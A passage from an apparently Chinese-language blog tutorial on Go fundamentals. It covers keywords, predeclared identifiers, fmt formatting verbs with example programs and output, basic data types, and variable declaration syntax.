函数）</p><p>函数体的左大括号必须和函数名在同行，不可换行在另一行或者单独成行，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//this is first demo code</span><br>fmt.Println(<span class="hljs-string">&quot;this is main func&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;this is init func&quot;</span>)<br>&#125;<br><br><br>➜  gocode <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span><br>this is init <span class="hljs-function"><span class="hljs-keyword">func</span></span><br>this is main <span class="hljs-function"><span class="hljs-keyword">func</span></span><br></code></pre></td></tr></table></figure><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><h4 id="语句-表达式"><a href="#语句-表达式" class="headerlink" title="语句&amp;表达式"></a>语句&amp;表达式</h4><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>单行注释：“\”的行</p><p>多行注释，块注释，不可嵌套使用</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">/* 开头</span><br><span class="hljs-comment">*/</span> 结尾<br></code></pre></td></tr></table></figure><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h3><p>GO程序可以由多个标记构成，标记可以是关键词、标识符、常量、字符串、符号等</p><h3 id="行分隔符"><a href="#行分隔符" class="headerlink" title="行分隔符"></a>行分隔符</h3><p>每一行代表一个语句结束，不需要分号结尾</p><p>如果将多个语句写入一行，每个语句就需要以分号分隔</p><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>用来命名变量、类型等程序实体</p><p>标识符规定：大小写字母、数字和下划线组成，必须以字母或者下划线开头，不能以数字开头Go语言关键字</p><h3 id="字符串连接符"><a href="#字符串连接符" class="headerlink" title="字符串连接符"></a>字符串连接符</h3><p>通过 + 进行字符串的连接</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function">func <span class="hljs-title">init</span>()</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;this is init func&quot;</span> + <span class="hljs-string">&quot; &quot;</span> + <span class="hljs-string">&quot;字符串连接符测试&quot;</span>)<br>&#125;<br><br>➜  gocode go run hello.go<br><span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">init</span> func 字符串连接符测试<br></code></pre></td></tr></table></figure><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><h4 id="25个关键字或保留字"><a href="#25个关键字或保留字" class="headerlink" title="25个关键字或保留字"></a>25个关键字或保留字</h4><h5 id="break"><a href="#break" class="headerlink" title="break"></a><strong>break</strong></h5><p>用于跳出循环，常和 for 循环或 switch 语句使用</p><h5 id="default"><a href="#default" class="headerlink" title="default"></a><strong>default</strong></h5><p>循环默认选项，用在switch和select语句中</p><h5 id="func"><a href="#func" class="headerlink" title="func"></a><strong>func</strong></h5><p>函数定义</p><h5 id="interface"><a href="#interface" class="headerlink" title="interface"></a>interface</h5><p>定义接口</p><h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><p>通道控制结构，类似 switch，作用对象为通道操作（发送或接收）</p><h5 id="case"><a href="#case" class="headerlink" title="case"></a>case</h5><p>用在switch语句之中，表示其中的一个分支</p><h5 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h5><p>延迟执行，函数的收尾工作，在函数结束前执行</p><h5 id="go"><a href="#go" class="headerlink" title="go"></a>go</h5><p>并发</p><h5 id="map"><a href="#map" class="headerlink" title="map"></a>map</h5><p>map结构类型</p><h5 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h5><p>定义结构体</p><h5 id="chan"><a href="#chan" class="headerlink" title="chan"></a>chan</h5><p>定义 channel</p><h5 id="else"><a href="#else" class="headerlink" title="else"></a>else</h5><p>用在条件语句中，表明当条件不成立时的分支</p><h5 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h5><p>跳转语句</p><h5 id="package"><a href="#package" class="headerlink" title="package"></a>package</h5><p>包</p><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><p>分支语句结构的引导词</p><h5 id="const"><a href="#const" class="headerlink" title="const"></a>const</h5><p>声明常量</p><h5 id="fallthrough"><a href="#fallthrough" class="headerlink" title="fallthrough"></a>fallthrough</h5><p>如果case带有fallthrough，程序会继续执行下一条case,不会再判断下一条case的值</p><h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><p>条件语句的判断</p><h5 id="range"><a href="#range" class="headerlink" title="range"></a>range</h5><p>从slice、map等结构中取元素</p><h5 id="type"><a href="#type" class="headerlink" title="type"></a>type</h5><p>定义类型</p><h5 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h5><p>回到一次循环的开始处</p><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><p>for 循环</p><p>import</p><p>引入指定的包或类</p><h5 id="return"><a href="#return" class="headerlink" title="return"></a>return</h5><p>从方法中返回</p><h5 id="var"><a href="#var" class="headerlink" title="var"></a>var</h5><p>声明变量</p><h4 id="36-个预定义标识"><a href="#36-个预定义标识" class="headerlink" title="36 个预定义标识"></a>36 个预定义标识</h4><table><thead><tr><th align="left">append</th><th align="left">bool</th><th align="left">byte</th><th align="left">cap</th><th align="left">close</th><th align="left">complex</th><th align="left">complex64</th><th align="left">complex128</th><th align="left">uint16</th></tr></thead><tbody><tr><td align="left">copy</td><td align="left">false</td><td align="left">float32</td><td align="left">float64</td><td align="left">imag</td><td align="left">int</td><td align="left">int8</td><td align="left">int16</td><td align="left">uint32</td></tr><tr><td align="left">int32</td><td align="left">int64</td><td align="left">iota</td><td align="left">len</td><td align="left">make</td><td align="left">new</td><td align="left">nil</td><td align="left">panic</td><td align="left">uint64</td></tr><tr><td align="left">print</td><td align="left">println</td><td align="left">real</td><td align="left">recover</td><td align="left">string</td><td align="left">true</td><td align="left">uint</td><td align="left">uint8</td><td align="left">uintptr</td></tr></tbody></table><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><h4 id="fmt-Sprintf"><a href="#fmt-Sprintf" class="headerlink" title="fmt.Sprintf"></a>fmt.Sprintf</h4><h5 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h5><p>fmt.Sprintf(格式化样式, 参数列表…)</p><p>格式化样式：字符串形式，格式化符号以 % 开头， %s 字符串格式，%d 十进制的整数格式</p><p>参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。</p><p>根据格式化参数生成格式化的字符串并写入标准输出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> inttype = <span class="hljs-number">123</span><br><span class="hljs-keyword">var</span> stringtype = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%d&amp;str=%s&quot;</span><br><span class="hljs-keyword">var</span> spliceresult = fmt.Sprintf(splice, inttype, stringtype)<br>fmt.Println(spliceresult)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">123</span>&amp;str=test<br></code></pre></td></tr></table></figure><h4 id="fmt-Printf"><a href="#fmt-Printf" class="headerlink" title="fmt.Printf"></a>fmt.Printf</h4><p>根据格式化参数生成格式化的字符串并返回该字符串</p><h5 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h5><p>fmt.Printf(格式化样式, 参数列表…)</p><p>格式化样式：字符串形式，格式化符号以 % 开头， %s 字符串格式，%d 十进制的整数格式。<br>参数列表：多个参数以逗号分隔，个数必须与格式化样式中的个数一一对应，否则运行时会报错。</p><h4 id="字符串格式化符号"><a href="#字符串格式化符号" class="headerlink" title="字符串格式化符号"></a>字符串格式化符号</h4><h5 id="v"><a href="#v" class="headerlink" title="%v"></a>%v</h5><p>按照值的本来值输出</p><h5 id="v-1"><a href="#v-1" class="headerlink" title="%+v"></a>%+v</h5><p>在 %v 基础上，对结构体字段名和值进行展开</p><h5 id="v-2"><a href="#v-2" class="headerlink" title="%#v"></a>%#v</h5><p>输出 Go 语言语法格式的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> inttype = <span class="hljs-number">123</span><br><span class="hljs-keyword">var</span> stringtype = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%b&amp;str=%#v&quot;</span><br>result := fmt.Sprintf(splice, inttype, stringtype)<br>io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">1111011</span>&amp;str=<span class="hljs-string">&quot;test&quot;</span>% <br></code></pre></td></tr></table></figure><h5 id="T"><a href="#T" class="headerlink" title="%T"></a>%T</h5><p>输出 Go 语言语法格式的类型和值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> stringtype = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;str=%T&quot;</span><br>result := fmt.Sprintf(splice, stringtype)<br>io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br>str=<span class="hljs-type">string</span>%     <br></code></pre></td></tr></table></figure><h5 id=""><a href="#" class="headerlink" title="%%"></a>%%</h5><p>输出 %</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;str=%%&quot;</span><br>result := fmt.Sprintf(splice)<br>io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br>str=%%    <br></code></pre></td></tr></table></figure><h5 id="b"><a href="#b" class="headerlink" title="%b"></a>%b</h5><p>整型以二进制方式显示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">66</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%b&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br><br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">1000010</span>%   <br></code></pre></td></tr></table></figure><h5 id="o"><a href="#o" class="headerlink" title="%o"></a>%o</h5><p>整型以八进制方式显示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">66</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%o&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">102</span>%   <br></code></pre></td></tr></table></figure><h5 id="d"><a href="#d" class="headerlink" title="%d"></a>%d</h5><p>整型以十进制方式显示</p><h5 id="x"><a href="#x" class="headerlink" title="%x"></a>%x</h5><p>整型以十六进制方式显示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">66</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%x&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span> <br><span class="hljs-type">int</span>=<span class="hljs-number">42</span>% <br></code></pre></td></tr></table></figure><h5 id="X"><a href="#X" class="headerlink" title="%X"></a>%X</h5><p>整型以十六进制方式显示，显示中的字母为大写</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">666666</span><br> <span class="hljs-comment">// var strtype = &quot;123kkkkk&quot;</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%x&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=a2c2a%  <br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">666666</span><br> <span class="hljs-comment">// var strtype = &quot;123kkkkk&quot;</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%X&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=A2C2A%  <br></code></pre></td></tr></table></figure><h5 id="U"><a href="#U" class="headerlink" title="%U"></a>%U</h5><p>Unicode字符</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">666666</span><br> <span class="hljs-comment">// var strtype = &quot;123kkkkk&quot;</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%U&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=U+A2C2A%   <br></code></pre></td></tr></table></figure><h5 id="f"><a href="#f" class="headerlink" title="%f"></a>%f</h5><p>浮点数</p><p>%.2f，小数点后两位精度</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br> <span class="hljs-keyword">var</span> inttype = <span class="hljs-number">6.66666</span><br> <span class="hljs-keyword">var</span> splice = <span class="hljs-string">&quot;int=%f&quot;</span><br> <span class="hljs-keyword">var</span> splice1 = <span class="hljs-string">&quot;\nint=%.2f&quot;</span><br> result := fmt.Sprintf(splice, inttype)<br> io.WriteString(os.Stdout, result)<br> result1 := fmt.Sprintf(splice1, inttype)<br> io.WriteString(os.Stdout, result1)<br>&#125;<br><br>➜  gocode <span class="hljs-keyword">go</span> run printgo.<span class="hljs-keyword">go</span><br><span class="hljs-type">int</span>=<span class="hljs-number">6.666660</span><br><span class="hljs-type">int</span>=<span class="hljs-number">6.67</span>%   <br></code></pre></td></tr></table></figure><h5 id="p"><a href="#p" class="headerlink" title="%p"></a>%p</h5><p>指针，十六进制显示</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型用于声明函数和变量，不同的数据类型代表不同大小内存大小</p><h3 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h3><p>值必须是常量 true 或者 false</p><p>var booltest bool &#x3D; true</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> code<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> booltest <span class="hljs-type">bool</span> = <span class="hljs-literal">true</span><br><span class="hljs-built_in">println</span>(booltest)<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">➜  code <span class="hljs-keyword">go</span> run booltest.<span class="hljs-keyword">go</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><h4 id="整型int"><a href="#整型int" class="headerlink" title="整型int"></a>整型int</h4><p>uint8  无符号 8 位整型 (0 到 255)</p><p>uint16  无符号 16 位整型（0 到 65535）</p><p>uint32 无符号 32 位整型  (0 到 4294967295)</p><p>uint64 无符号 64 位整型 (0 到 18446744073709551615)</p><p>int8 有符号 8 位整型（-128 到 127）</p><p>int16 有符号 16 位整型  (-32768 到 32767)</p><p>int32 有符号 32 位整型  (-2147483648 到 2147483647)</p><p>int64 有符号 64 位整型  (-9223372036854775808 到 9223372036854775807)</p><p>byte 类似uint8</p><p>rune 类似int32</p><p>uint 32 或 64 位</p><p>int 与uint一样大小</p><p>uintptr 无符号整型，用于存放一个指针</p><h4 id="浮点型-float"><a href="#浮点型-float" class="headerlink" title="浮点型 float"></a>浮点型 float</h4><p> float32、float64</p><p>支持复数，位的运算采用补码</p><h3 id="派生类型"><a href="#派生类型" class="headerlink" title="派生类型"></a>派生类型</h3><p>指针类型 Pointer</p><p>数组类型</p><p>结构化类型 struct</p><p>Channel类型</p><p>函数类型</p><p>切片类型</p><p>接口类型 interface</p><p>Map类型</p><h2 id="变量-1"><a href="#变量-1" class="headerlink" title="变量"></a>变量</h2><p>变量可以通过变量名访问</p><p>变量名由字母、数字、下划线组成，首字母不可以是数字</p><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>声明变量使用 var 关键字</p><h4 id="声明变量类型"><a href="#声明变量类型" class="headerlink" title="声明变量类型"></a>声明变量类型</h4><p>var 变量名 变量类型</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> vartest <span class="hljs-built_in">string</span><br></code></pre></td></tr></table></figure><p>整型变量未赋值，默认是0</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">//声明整型变量不初始化，默认是空值</span><br>var <span class="hljs-built_in">int</span>test <span class="hljs-built_in">int</span><br>fmt.Println(<span class="hljs-built_in">int</span>test)<br><br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>布尔型变量未赋值，默认是false</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">//声明布尔型变量不初始化，默认是false</span><br>var <span class="hljs-built_in">bool</span>test <span class="hljs-built_in">bool</span><br>fmt.Println(<span class="hljs-built_in">bool</span>test)<br><br><span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>字符型变量未赋值，默认是“”，空字符串</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">//声明字符变量不初始化，默认是空</span><br><span class="hljs-keyword">var</span> strtest <span class="hljs-built_in">string</span><br><span class="hljs-comment">//strtest = &quot;strtest&quot;</span><br>fmt.Println(strtest)<br></code></pre></td></tr></table></figure><h4 id="根据值自动设置变量类型"><a href="#根据值自动设置变量类型" class="headerlink" title="根据值自动设置变量类型"></a>根据值自动设置变量类型</h4><p>var 变量名 &#x3D; 变量值</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">var <span class="hljs-built_in">bool</span>vartest = <span class="hljs-literal">true</span><br>fmt.Println(<span class="hljs-built_in">bool</span>vartest)<br><br>var <span class="hljs-built_in">string</span>vartest = <span class="hljs-string">&quot;this is string var test&quot;</span><br>fmt.Println(<span class="hljs-built_in">string</span>vartest)<br></code></pre></td></tr></table></figure><h4 id="声明-赋值"><a href="#声明-赋值" class="headerlink" title="声明+赋值"></a>声明+赋值</h4><p>变量名 :&#x3D; 变量值</p><p>注意：已经使用 var 声明过的变量，再使用 :&#x3D; 会报错</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">string</span>var1test := <span class="hljs-string">&quot;this is var := test &quot;</span><br>fmt.Println(<span class="hljs-built_in">string</span>var1test)<br><br>var <span class="hljs-built_in">string</span>vartest <span class="hljs-built_in">string</span> = <span class="hljs-string">&quot;this is string var test&quot;</span><br>fmt.Println(<span class="hljs-built_in">string</span>vartest)<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim">var stringvartest <span class="hljs-built_in">string</span> = <span class="hljs-string">&quot;this is string var test&quot;</span><br>fmt.Println(stringvartest)<br><br>stringvartest := <span class="hljs-string">&quot;error test&quot;</span><br>fmt.Println(stringvartest)<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span><br># <span class="hljs-keyword">command</span>-<span class="hljs-built_in">line</span>-arguments<br>./hello.<span class="hljs-keyword">go</span>:<span class="hljs-number">17</span>:<span class="hljs-number">16</span>: <span class="hljs-keyword">no</span> <span class="hljs-keyword">new</span> variables <span class="hljs-keyword">on</span> <span class="hljs-keyword">left</span> side of :=<br></code></pre></td></tr></table></figure><h4 id="多变量声明赋值"><a href="#多变量声明赋值" class="headerlink" title="多变量声明赋值"></a>多变量声明赋值</h4><p>var name1,name2,name3 type &#x3D; value1, value2, value3</p><p>name11,name12 :&#x3D; value11,value12</p><p>var test1,test2,test3 int &#x3D; 1,2,3</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> test1, test2, test3 <span class="hljs-type">int</span> = <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span><br>fmt.Println(test1, test2, test3)<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span> <br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">test11, test12, test13 := <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span><br>fmt.Println(test11, test12, test13)<br><br>➜  firstGoland <span class="hljs-keyword">go</span> run hello.<span class="hljs-keyword">go</span> <br><span class="hljs-number">11</span> <span class="hljs-number">12</span> <span class="hljs-number">13</span><br></code></pre></td></tr></table></figure><h4 id="全局变量声明"><a href="#全局变量声明" class="headerlink" title="全局变量声明"></a>全局变量声明</h4><p>var (</p><p>   name1 type1</p><p>   name2 type2</p><p>)</p><h3 id="值类型-指针类型"><a href="#值类型-指针类型" class="headerlink" title="值类型&#x2F;指针类型"></a>值类型&#x2F;指针类型</h3><p>类似 int, float, bool, string等这些基本类型，使用这些变量就是直接指向存在内存的值</p><p>使用等号&#x3D;，将一个变量的值赋给另一个变量，也就是将指定内存中的值拷贝一份过去</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>1、:&#x3D; 不可以用于全局变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>a <span class="hljs-type">int</span><br>b <span 